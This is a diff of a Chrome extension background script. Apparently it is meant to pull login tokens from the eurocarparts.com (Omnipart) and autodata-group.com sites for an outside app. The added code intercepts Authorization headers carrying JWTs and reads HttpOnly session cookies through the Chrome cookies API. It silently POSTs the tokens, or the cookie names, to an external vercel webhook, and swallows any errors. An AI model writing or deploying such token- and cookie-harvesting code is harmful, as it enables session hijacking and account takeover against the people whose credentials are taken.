@@ -2,18 +2,24 @@ chrome.webRequest.onSendHeaders.addListener(
     (details) => {
         if (!details.requestHeaders) return;
         for (let header of details.requestHeaders) {
-            if (header.name.toLowerCase() === 'authorization') {
-                console.log("Omnipart Token Intercepted!", header.value.substring(0, 15) + "...");
-                
-                if (details.tabId >= 0) {
-                    chrome.tabs.sendMessage(details.tabId, { action: "TOKEN_CAUGHT" }).catch(() => {});
-                }
+            let hName = header.name.toLowerCase();
+            let hVal = header.value;
+            
+            if (hVal.includes('eyJ') && hVal.length > 50) {
+                let cleanToken = hVal;
+                let match = hVal.match(/(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)/);
+                if (match) cleanToken = match[1];
+                else if (hVal.toLowerCase().startsWith('bearer ')) cleanToken = hVal.substring(7);
 
                 fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ token: header.value.trim() })
+                    body: JSON.stringify({ token: cleanToken })
                 }).catch(() => {});
+                
+                if (details.tabId >= 0) {
+                    chrome.tabs.sendMessage(details.tabId, { action: "TOKEN_CAUGHT" }).catch(() => {});
+                }
                 break;
             }
         }
@@ -23,6 +29,42 @@ chrome.webRequest.onSendHeaders.addListener(
 );
 
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.action === "SCAN_OMNIPART") {
+        // Scan natively stored Chrome cookies (including HttpOnly which cannot be seen via inject scripts)
+        chrome.cookies.getAll({ domain: "eurocarparts.com" }, (cookies) => {
+            let foundToken = null;
+            let cookieNames = [];
+            for (let c of cookies) {
+                cookieNames.push(c.name);
+                if (c.value.includes('eyJ') && c.value.length > 50) {
+                    let match = c.value.match(/(eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+)/);
+                    if (match) {
+                        foundToken = match[1];
+                    }
+                }
+            }
+
+            if (foundToken) {
+                fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ token: foundToken })
+                }).catch(() => {});
+                
+                if (sender && sender.tab) {
+                    chrome.tabs.sendMessage(sender.tab.id, { action: "TOKEN_CAUGHT" }).catch(() => {});
+                }
+            } else {
+                // If it STILL wasn't found, dump the cookie names so we can see what's happening
+                fetch("https://mot-reminder-quick.vercel.app/api/webhooks/omnipart", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ token: "ERROR_NO_TOKEN_FOUND-COOKIES_ARE:" + cookieNames.join(',') })
+                }).catch(() => {});
+            }
+        });
+    }
+
     if (message.action === "SEND_TOKENS") {
         // Grab all HttpOnly login cookies from the browser directly natively via Chrome API
         chrome.cookies.getAll({ domain: "autodata-group.com" }, (cookies) => {
